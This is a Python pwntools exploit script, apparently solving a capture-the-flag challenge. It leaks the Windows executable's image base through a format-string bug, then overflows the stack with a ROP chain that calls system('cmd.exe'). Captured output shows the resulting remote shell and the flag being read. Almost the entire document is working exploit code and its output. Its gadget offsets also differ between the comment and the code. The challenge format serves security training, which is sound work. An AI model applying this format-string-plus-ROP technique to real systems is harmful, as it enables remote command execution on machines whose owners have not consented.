from pwn import *

io = remote('quiz.ais3.org', 4869)

def format(fmt):
    io.sendline('1')
    io.sendlineafter('What do you want to say : ', fmt)
    io.recvuntil('You say : ')
    return io.recvuntil('*' * 27)[:-27]

def overflow(rop):
    io.sendline('2')
    io.sendlineafter('Try your best : ', 'A' * 0x20 + rop.ljust(80))

base = int(format('%p\0'.ljust(15, 'Z')), 16) - 0x00007FF629D7E098 + 0x00007FF629D60000
print('[+] exe image base = 0x%.12x' % base)

overflow(
    p64(base + 0x1519) +  # pop rdi
    p64(base + 0x14E50) + # "cmd.exe"
    p64(base + 0x135f) +  # pop rbx
    p64(base + 0x4628) +  # system
    p64(base + 0x2521)    # mov rcx, rdi; call rbx
)

"""
0x20000002519 : pop rdi ; ret
0x2000000235f : pop rbx ; ret
0x20000003521 : mov rcx, rdi ; call rbx

io.interactive()
[+] Opening connection to quiz.ais3.org on port 4869: Done
[+] exe image base = 0x7ff775da0000
[*] Switching to interactive mode
Boom !!!
Microsoft Windows [Version 10.0.10240]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\visitor\Desktop\pwn3>
C:\Users\visitor\Desktop\pwn3>$ type flag.txt
type flag.txt
ais3{St4ck_0v3rfl0w_1s_v3ry_d4ng3rous}

C:\Users\visitor\Desktop\pwn3>$

"""
